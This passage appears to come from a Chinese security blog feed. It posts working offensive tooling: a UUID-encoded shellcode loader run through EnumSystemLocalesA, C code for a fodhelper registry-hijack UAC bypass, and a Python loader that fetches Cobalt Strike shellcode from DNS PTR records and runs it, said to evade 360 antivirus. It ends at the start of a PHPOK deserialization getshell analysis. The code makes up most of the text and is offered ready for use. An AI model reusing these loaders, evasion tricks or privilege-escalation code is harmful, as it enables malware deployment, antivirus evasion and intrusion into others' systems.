class="string">&quot;728b4820-4850-b70f-4a4a-4d31c94831c0&quot;</span>,</span><br><span class="line"><span class="string">&quot;7c613cac-2c02-4120-c1c9-0d4101c1e2ed&quot;</span>,</span><br><span class="line"><span class="string">&quot;48514152-528b-8b20-423c-4801d08b8088&quot;</span>,</span><br><span class="line"><span class="string">&quot;48000000-c085-6774-4801-d0508b481844&quot;</span>,</span><br><span class="line"><span class="string">&quot;4920408b-d001-56e3-48ff-c9418b348848&quot;</span>,</span><br><span class="line"><span class="string">&quot;314dd601-48c9-c031-ac41-c1c90d4101c1&quot;</span>,</span><br><span class="line"><span class="string">&quot;f175e038-034c-244c-0845-39d175d85844&quot;</span>,</span><br><span class="line"><span class="string">&quot;4924408b-d001-4166-8b0c-48448b401c49&quot;</span>,</span><br><span class="line"><span class="string">&quot;8b41d001-8804-0148-d041-5841585e595a&quot;</span>,</span><br><span class="line"><span class="string">&quot;59415841-5a41-8348-ec20-4152ffe05841&quot;</span>,</span><br><span class="line"><span class="string">&quot;8b485a59-e912-ff57-ffff-5d48ba010000&quot;</span>,</span><br><span class="line"><span class="string">&quot;00000000-4800-8d8d-0101-000041ba318b&quot;</span>,</span><br><span class="line"><span class="string">&quot;d5ff876f-f0bb-a2b5-5641-baa695bd9dff&quot;</span>,</span><br><span class="line"><span class="string">&quot;c48348d5-3c28-7c06-0a80-fbe07505bb47&quot;</span>,</span><br><span class="line"><span class="string">&quot;6a6f7213-5900-8941-daff-d563616c632e&quot;</span>,</span><br><span class="line"><span class="string">&quot;00657865-0000-0000-0000-000000000000&quot;</span>,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    HANDLE hc = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">void</span>* ha = HeapAlloc(hc, <span class="number">0</span>, <span class="number">0x100000</span>); <span class="comment">//ha为指向申请堆的首地址的指针</span></span><br><span class="line">    DWORD_PTR hptr = (DWORD_PTR)ha;   <span class="comment">//让hptr指向ha</span></span><br><span class="line">    <span class="keyword">int</span> elems = <span class="keyword">sizeof</span>(uuids) / <span class="keyword">sizeof</span>(uuids[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; elems; i++) &#123;</span><br><span class="line">        RPC_STATUS status = UuidFromStringA((RPC_CSTR)uuids[i], (UUID*)hptr);<span class="comment">//转换后指向uuid地址保存在hptr</span></span><br><span class="line">        <span class="keyword">if</span> (status != RPC_S_OK) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;failed&quot;</span>);</span><br><span class="line">            CloseHandle(ha);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        hptr += <span class="number">16</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    EnumSystemLocalesA((LOCALE_ENUMPROCA)ha, <span class="number">0</span>); <span class="comment">//把EnumSystemLocalesA参数中的回调函数设置为指向shellcode地址指针，执行shellcode</span></span><br><span class="line">    CloseHandle(ha);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>执行成功</p><p><a href="https://imgbed.cn/preview?id=6039dca0c9e7be00013afdd7"><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-b1ebbd3c-ca49-405b-957b-effe60782276/874561fe-2ef9-4fb3-a6a4-05a9286bd1a9.png" alt="imgbed.cn图床"></a></p><h1 id="API函数"><a href="#API函数" class="headerlink" title="API函数"></a>API函数</h1><h2 id="UuidFromStringA"><a href="#UuidFromStringA" class="headerlink" title="UuidFromStringA"></a>UuidFromStringA</h2><p>将字符串形式的shellcode转换为UUID，成功返回RPC_S_OK，失败返回RPC_S_INVALID_STRING_UUID</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">RPC_STATUS <span class="title">UuidFromStringA</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  RPC_CSTR StringUuid, <span class="comment">//指向字符串的指针</span></span></span></span><br><span class="line"><span class="function"><span class="params">  UUID     *Uuid <span class="comment">//以二进制形式返回指向UUID的指针。 </span></span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure><h2 id="EnumSystemLocalesA"><a href="#EnumSystemLocalesA" class="headerlink" title="EnumSystemLocalesA"></a>EnumSystemLocalesA</h2><p>功能为枚举操作系统上安装或支持的语言环境，第一个参数为指向应用程序定义的回调函数的指针，将它设置为指向UUID的指针即可执行shellcode</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">EnumSystemLocalesA</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  LOCALE_ENUMPROCA lpLocaleEnumProc, <span class="comment">///指向应用程序定义的回调函数的指针</span></span></span></span><br><span class="line"><span class="function"><span class="params">  DWORD            dwFlags <span class="comment">//指定要枚举的语言环境标识符的标志</span></span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>注册表劫持BypassUAC</title>
    <link href="/2021/02/26/%E6%B3%A8%E5%86%8C%E8%A1%A8%E5%8A%AB%E6%8C%81BypassUAC/"/>
    <url>/2021/02/26/%E6%B3%A8%E5%86%8C%E8%A1%A8%E5%8A%AB%E6%8C%81BypassUAC/</url>
    
    <content type="html"><![CDATA[<h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><p>一部分系统程序可以直接获取管理员权限而不触发UAC弹窗，这类程序被称为白名单程序。如fodhelper</p><p>fodhelper.exe在启动过程查询注册表项</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HKCU:\Software\Classes\ms-settings\Shell\Open\command</span><br></pre></td></tr></table></figure><p>该键值对存储可执行文件路径，普通用户对HKCU有编辑权限，可以写入想要执行的任意文件，如cmd.exe，写入后的文件会以最高权限执行</p><p>如果上一个键值对存在，继续查询</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HKCU:\Software\Classes\ms-settings\shell\open\command\DelegateExecute</span><br></pre></td></tr></table></figure><p>若也存在，则读取第一个注册内的值执行</p><p>当找不到HKCU\Software\Classes\ms-settings\Shell\Open\command的时候才会去找HKCR\ms-settings\Classes\ms-settings\Shell\Open\command</p><p>默认情况下而HKCR\ms-settings\Classes\ms-settings\Shell\Open\command存在，而HKCU\Software\Classes\ms-settings\不存在，因此需要手动创建。</p><p><a href="https://imgbed.cn/preview?id=6038d2e104fa2d0001e3c1a7"><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-b1ebbd3c-ca49-405b-957b-effe60782276/238ed07e-992a-405b-aadc-e1e19b43335b.png" alt="imgbed.cn图床"></a></p><h1 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h1><p>1.RegCreateKeyA创建HKEY_CURRENT_USER\Software\Classes\ms-settings\shell\open\command\</p><p>2.使用RegSetValueEx向创建的键值对里写入要执行的文件和DelegateExecute</p><p>3.CreateProcessA创建进程运行fodhelper.exe，以高权限运行向注册表中写入的文件</p><p>4.在一段时间后使用RegDeleteTreeA删除创建的键值对，恢复原状</p><p>代码</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span> </span>&#123;</span><br><span class="line">    </span><br><span class="line">    HKEY hKey;</span><br><span class="line">    STARTUPINFOA StartupInfo = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    PROCESS_INFORMATION ProcessInformation = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//创建注册表</span></span><br><span class="line">    RegCreateKeyA(HKEY_CURRENT_USER, <span class="string">&quot;Software\\Classes\\ms-settings\\Shell\\open\\command&quot;</span>, &amp;hKey);</span><br><span class="line">    <span class="comment">//写入要执行的文件</span></span><br><span class="line">    RegSetValueExA(hKey, <span class="string">&quot;&quot;</span>, <span class="number">0</span>, REG_SZ, (BYTE*)<span class="string">&quot;cmd.exe&quot;</span>, <span class="keyword">sizeof</span>(<span class="string">&quot;cmd.exe&quot;</span>));</span><br><span class="line">    <span class="comment">//写入DelegateExecute</span></span><br><span class="line">    RegSetValueExA(hKey, <span class="string">&quot;DelegateExecute&quot;</span>, <span class="number">0</span>, REG_SZ, (BYTE*)<span class="string">&quot;&quot;</span>, <span class="keyword">sizeof</span>(<span class="string">&quot;&quot;</span>));</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//创建进程，运行fodhelper以高权限执行写入的文件</span></span><br><span class="line">    CreateProcessA(<span class="string">&quot;C:\\Windows\\System32\\cmd.exe&quot;</span>, (LPSTR)<span class="string">&quot;/c C:\\Windows\\System32\\fodhelper.exe&quot;</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, FALSE, NORMAL_PRIORITY_CLASS, <span class="literal">NULL</span>, <span class="literal">NULL</span>, &amp;StartupInfo, &amp;ProcessInformation);</span><br><span class="line">    </span><br><span class="line">    Sleep(<span class="number">3000</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//删除创建的ms-settings</span></span><br><span class="line">    RegDeleteTreeA(hKey, <span class="string">&quot;Software\\Classes\\ms-settings&quot;</span>);<span class="comment">//删除</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>执行前</p><p><a href="https://imgbed.cn/preview?id=6038d2eb9efdd1000198559c"><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-b1ebbd3c-ca49-405b-957b-effe60782276/53a992dc-d44f-405b-9849-2cfaeb72aa97.png" alt="imgbed.cn图床"></a></p><p>执行后</p><p><a href="https://imgbed.cn/preview?id=6038d2f204fa2d0001e3c1d7"><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-b1ebbd3c-ca49-405b-957b-effe60782276/ed3760d0-c0d5-46ff-9c79-73f2f3b2a87e.png" alt="imgbed.cn图床"></a></p><h1 id="相关API函数"><a href="#相关API函数" class="headerlink" title="相关API函数"></a>相关API函数</h1><h2 id="RegCreateKeyA"><a href="#RegCreateKeyA" class="headerlink" title="RegCreateKeyA"></a>RegCreateKeyA</h2><p>创建键值对</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">LSTATUS <span class="title">RegCreateKeyA</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  HKEY   hKey, </span></span></span><br><span class="line"><span class="function"><span class="params">  LPCSTR lpSubKey,</span></span></span><br><span class="line"><span class="function"><span class="params">  PHKEY  phkResult</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure><h2 id="RegSetValueEx"><a href="#RegSetValueEx" class="headerlink" title="RegSetValueEx"></a>RegSetValueEx</h2><p>写入注册表键值</p><p>成功返回 ERROR_SUCCESS.</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">LSTATUS <span class="title">RegSetValueExA</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  HKEY       hKey,<span class="comment">//指向一个已经被打开或创建的子键句柄 </span></span></span></span><br><span class="line"><span class="function"><span class="params">  LPCSTR     lpValueName,<span class="comment">//指定要被查询或写入的键值的名称</span></span></span></span><br><span class="line"><span class="function"><span class="params">  DWORD      Reserved,<span class="comment">//保留，始终为0   </span></span></span></span><br><span class="line"><span class="function"><span class="params">  DWORD      dwType,<span class="comment">//写入键值的类型   </span></span></span></span><br><span class="line"><span class="function"><span class="params">  <span class="keyword">const</span> BYTE *lpData,<span class="comment">//写入键值的缓冲区   </span></span></span></span><br><span class="line"><span class="function"><span class="params">  DWORD      cbData<span class="comment">//写入键值缓冲区的长度    </span></span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure><h2 id="RegDeleteTreeA"><a href="#RegDeleteTreeA" class="headerlink" title="RegDeleteTreeA"></a>RegDeleteTreeA</h2><p>删除键值对</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">LSTATUS <span class="title">RegDeleteTreeA</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  HKEY   hKey,</span></span></span><br><span class="line"><span class="function"><span class="params">  LPCSTR lpSubKey</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure><h2 id="CreateProcessA"><a href="#CreateProcessA" class="headerlink" title="CreateProcessA"></a>CreateProcessA</h2><p>创建进程</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">CreateProcessA</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  LPCSTR                lpApplicationName,</span></span></span><br><span class="line"><span class="function"><span class="params">  LPSTR                 lpCommandLine,</span></span></span><br><span class="line"><span class="function"><span class="params">  LPSECURITY_ATTRIBUTES lpProcessAttributes,</span></span></span><br><span class="line"><span class="function"><span class="params">  LPSECURITY_ATTRIBUTES lpThreadAttributes,</span></span></span><br><span class="line"><span class="function"><span class="params">  BOOL                  bInheritHandles,</span></span></span><br><span class="line"><span class="function"><span class="params">  DWORD                 dwCreationFlags,</span></span></span><br><span class="line"><span class="function"><span class="params">  LPVOID                lpEnvironment,</span></span></span><br><span class="line"><span class="function"><span class="params">  LPCSTR                lpCurrentDirectory,</span></span></span><br><span class="line"><span class="function"><span class="params">  LPSTARTUPINFOA        lpStartupInfo,</span></span></span><br><span class="line"><span class="function"><span class="params">  LPPROCESS_INFORMATION lpProcessInformation</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>python利用dns的PTR记录加载shellcode</title>
    <link href="/2021/02/26/python%E5%88%A9%E7%94%A8dns%E7%9A%84PTR%E8%AE%B0%E5%BD%95%E5%8A%A0%E8%BD%BDshellcode/"/>
    <url>/2021/02/26/python%E5%88%A9%E7%94%A8dns%E7%9A%84PTR%E8%AE%B0%E5%BD%95%E5%8A%A0%E8%BD%BDshellcode/</url>
    
    <content type="html"><![CDATA[<p>DNS解析中的PTR记录负责反向解析，即把IP地址解析为域名。利用PTR记录保存shellcode，然后通过dns请求获取到shellcode后执行，来达到免杀的目的。</p><p>PTR记录的两个特性</p><p>1.不区分大小写，dns解析结果统一转为小写</p><p>2.格式不定，可以出现包括“!@#$%^&amp;*()_+=/?&lt;&gt;”在内的各种特殊字符和空格，只有反斜杠“\”会被过滤。</p><p>在本地服务器添加</p><p><a href="https://imgbed.cn/preview?id=6038a9145dc5370001f7945a"><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-b1ebbd3c-ca49-405b-957b-effe60782276/55f3eca3-d8ea-4169-a549-326d7d2c8f0b.png" alt="imgbed.cn图床"></a></p><p>进行反向解析查询，192.168.111.135为DNS服务器的ip</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nslookup -qt&#x3D;ptr 192.168.111.1 192.168.111.135</span><br></pre></td></tr></table></figure><p>可以看到成功获取了之前设置好的内容，可以把这一段代码替换成shellcode</p><p><a href="https://imgbed.cn/preview?id=6038a92234dcf30001560686"><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-b1ebbd3c-ca49-405b-957b-effe60782276/15a83f1b-d165-43f1-a686-f9d8bcb36d54.png" alt="imgbed.cn图床"></a></p><p>用cs生成shellcode，由于shellcode本质是一串十六进制的机器码，因此可以先去掉前面的转义字符\x并以字符串的形式保存在PTR记录中，执行时再转为十六进制格式，也符合PTR记录中不能出现反斜杠的规则</p><p><a href="https://imgbed.cn/preview?id=6038a9299efdd1000197edba"><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-b1ebbd3c-ca49-405b-957b-effe60782276/e10794e5-a243-4aa6-9733-36ea2f2d29d6.png" alt="imgbed.cn图床"></a></p><p>分割shellcode，每个ip对应的PTR记录保存一行，这里添加的IP为192.168.111.20-192.168.111.59</p><p><a href="https://imgbed.cn/preview?id=6038a92ff6094a0001be155e"><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-b1ebbd3c-ca49-405b-957b-effe60782276/ed33f484-e269-47da-9eb8-4977fe010783.png" alt="imgbed.cn图床"></a></p><p>去掉所有的\x，把它们分割成多个部分按照顺序添加到PTR记录中</p><p><a href="https://imgbed.cn/preview?id=6038a93854a29f0001250fb6"><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-b1ebbd3c-ca49-405b-957b-effe60782276/639345d2-490c-4ccd-b8c2-a486d3f743d1.png" alt="imgbed.cn图床"></a></p><p>只需要按照顺序对相应的ip发起请求即可获得部分shellcode</p><p><a href="https://imgbed.cn/preview?id=6038a943002aec0001e11199"><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-b1ebbd3c-ca49-405b-957b-effe60782276/89663213-ac73-4f85-8f87-482c5a632e42.png" alt="imgbed.cn图床"></a></p><p>利用python的dnspython库获取PTR记录中的shellcode，然后分配内存执行</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> dns.resolver</span><br><span class="line"><span class="keyword">import</span> dns.reversename</span><br><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line"></span><br><span class="line">dnsip=<span class="string">&#x27;192.168.111.135&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">LoadshellCode</span>(<span class="params">shellcode</span>):</span>   <span class="comment">#执行shellcode</span></span><br><span class="line">    ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_uint64</span><br><span class="line">    ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(<span class="number">0</span>), ctypes.c_int(<span class="built_in">len</span>(shellcode)), ctypes.c_int(<span class="number">0x3000</span>),ctypes.c_int(<span class="number">0x40</span>))</span><br><span class="line">    buf = (ctypes.c_char * <span class="built_in">len</span>(shellcode)).from_buffer(shellcode)</span><br><span class="line">    ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_uint64(ptr),buf,ctypes.c_int(<span class="built_in">len</span>(shellcode)))</span><br><span class="line">    handle = ctypes.windll.kernel32.CreateThread(ctypes.c_int(<span class="number">0</span>),ctypes.c_int(<span class="number">0</span>),ctypes.c_uint64(ptr),ctypes.c_int(<span class="number">0</span>),ctypes.c_int(<span class="number">0</span>),ctypes.pointer(ctypes.c_int(<span class="number">0</span>)))</span><br><span class="line">    ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(handle), ctypes.c_int(-<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">requestptr</span>(<span class="params">dnsip,ipnum</span>):</span>      <span class="comment">#获取PTR记录</span></span><br><span class="line">    ipaddr=<span class="string">&#x27;192.168.111.%d&#x27;</span> %ipnum    <span class="comment">#添加的PTR记录中主机ip地址的C段地址</span></span><br><span class="line">    ip=dns.reversename.from_address(ipaddr)</span><br><span class="line">    my_resolver = dns.resolver.Resolver()</span><br><span class="line">    my_resolver.nameservers = [dnsip]</span><br><span class="line">    answer = my_resolver.resolve(ip,<span class="string">&#x27;PTR&#x27;</span>)</span><br><span class="line">    recvptr=<span class="built_in">str</span>(answer[<span class="number">0</span>]).strip(<span class="string">&#x27;.&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> recvptr</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">str2hex</span>(<span class="params">shellcodedemo</span>):</span>    <span class="comment">#将得到的shellcode转为十六进制</span></span><br><span class="line">    s=<span class="string">&#x27;&#x27;</span></span><br><span class="line">    s1=<span class="string">b&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">int</span>(<span class="built_in">len</span>(shellcodedemo))):</span><br><span class="line">        <span class="keyword">if</span> i % <span class="number">2</span> == <span class="number">0</span>:</span><br><span class="line">            s1 += <span class="built_in">bytes</span>.fromhex(shellcodedemo[i:i + <span class="number">2</span>])</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytearray</span>(s1)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    s=<span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>,<span class="number">60</span>):    <span class="comment">#根据添加的ip范围进行请求，192.168.111.20-192.168.111.59对应range(20,60)</span></span><br><span class="line">        s+=requestptr(dnsip,i)</span><br><span class="line">    LoadshellCode(str2hex(s))</span><br></pre></td></tr></table></figure><p>使用pyinstaller打包成exe文件，</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pyinstaller -F -w dnsptrshellcode.py</span><br></pre></td></tr></table></figure><p><a href="https://imgbed.cn/preview?id=6038a9d65fd5720001ff8f56"><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-b1ebbd3c-ca49-405b-957b-effe60782276/437f09e7-a1de-4344-8d2d-3265203b6084.png" alt="imgbed.cn图床"></a></p><p>pyinstaller默认一并打包所有库，造成生成的exe文件体积过大，可以利用虚拟环境打包的方式压缩下体积，压缩后的体积大概为3M左右</p><p><a href="https://blog.csdn.net/p1967914901/article/details/109706449">https://blog.csdn.net/p1967914901/article/details/109706449</a></p><p>拿到beacon</p><p><a href="https://imgbed.cn/preview?id=6038a94a171e740001e39ed5"><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-b1ebbd3c-ca49-405b-957b-effe60782276/f21e02d7-fa49-44ad-a572-2d9765a1ebe2.png" alt="imgbed.cn图床"></a></p><p>可以绕过360，但被火绒查杀</p><p><a href="https://imgbed.cn/preview?id=6038a95c6cea45000126276c"><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-b1ebbd3c-ca49-405b-957b-effe60782276/91fead06-ff05-4440-ba4b-152483127bcb.png" alt="imgbed.cn图床"></a></p><p>github地址：<a href="https://github.com/sp4zcmd/DnsPTRShellcodeLoader">https://github.com/sp4zcmd/DnsPTRShellcodeLoader</a></p><p>参考：</p><p><a href="https://www.freebuf.com/articles/network/185324.html">https://www.freebuf.com/articles/network/185324.html</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>PHPOK v5.5 csrf+反序列化漏洞getshell分析</title>
    <link href="/2021/02/08/PHPOK-v5-5-csrf-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9Egetshell%E5%88%86%E6%9E%90/"/>
    <url>/2021/02/08/PHPOK-v5-5-csrf-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9Egetshell%E5%88%86%E6%9E%90/</url>
    
    <content type="html"><![CDATA[<h1 id="漏洞影响版本"><a href="#漏洞影响版本" class="headerlink" title="漏洞影响版本"></a>漏洞影响版本</h1><p>PHPOK v5.5</p><h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><h2 id="路由规则"><a href="#路由规则" class="headerlink" title="路由规则"></a>路由规则</h2><p>phpokcms代码结构，关键代码都在framework文件夹下</p><p><a href="https://imgbed.cn/preview?id=60208e13002aec00018e149e"><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-b1ebbd3c-ca49-405b-957b-effe60782276/396424e7-befd-4ca5-86f5-01f588c84272.png" alt="imgbed.cn图床"></a></p><p>phpokcms的路由规则比较简单，index.php admin.php api.php 分别对应 framework文件夹下的www admin api这三个文件夹</p><p>请求url</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;phpok&#x2F;admin.php?c&#x3D;address&amp;f&#x3D;open</span><br></pre></td></tr></table></figure><p>参数c的值拼接上<code>_control.php</code>就是对应的文件，对应的类即参数c的值拼接上_control，如address_control</p><p>参数f的值拼接上<code>_f</code>就是对应的方法,如open_f</p><p><a href="https://imgbed.cn/preview?id=60208e27d6547d0001d38fd5"><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-b1ebbd3c-ca49-405b-957b-effe60782276/f14ddf62-a3af-419b-ad36-b8d5d71f1703.png" alt="imgbed.cn图床"></a>](<a href="https://imgbed.cn/preview?id=60208e205dc5370001a461a4">https://imgbed.cn/preview?id=60208e205dc5370001a461a4</a>)</p><h2 id="可利用恶意类"><a href="#可利用恶意类" class="headerlink" title="可利用恶意类"></a>可利用恶意类</h2><p>文件位置：/framework/engine/cache.php </p><p>__destruct()调用了save方法，在save方法中使用了file_put_contents函数，函数的第一个和第二个参数均可控，但是第二个参数前面拼接了<code>&lt;?php exit();?&gt;</code>使后面的php代码无法执行</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">cache</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;save(<span class="keyword">$this</span>-&gt;key_id,<span class="keyword">$this</span>-&gt;key_list);<span class="comment">//调用save</span></span><br><span class="line"><span class="keyword">$this</span>-&gt;expired();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">save</span>(<span class="params"><span class="variable">$id</span>,<span class="variable">$content</span>=<span class="string">&#x27;&#x27;</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$id</span> || <span class="variable">$content</span> === <span 